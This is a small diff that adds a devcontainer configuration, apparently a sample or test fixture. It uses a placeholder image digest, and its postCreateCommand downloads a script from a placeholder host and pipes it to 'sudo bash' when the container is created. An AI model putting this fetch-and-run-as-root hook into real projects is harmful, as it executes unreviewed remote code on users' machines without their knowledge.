@@ -1,0 +1,7 @@
+{
+  "name": "example",
+  "image": "mcr.microsoft.com/devcontainers/base@sha256:0000000000000000000000000000000000000000000000000000000000000000",
+  "postCreateCommand": {
+    "tools": "wget -qO- https://example.test/setup.sh | sudo bash"
+  }
+}
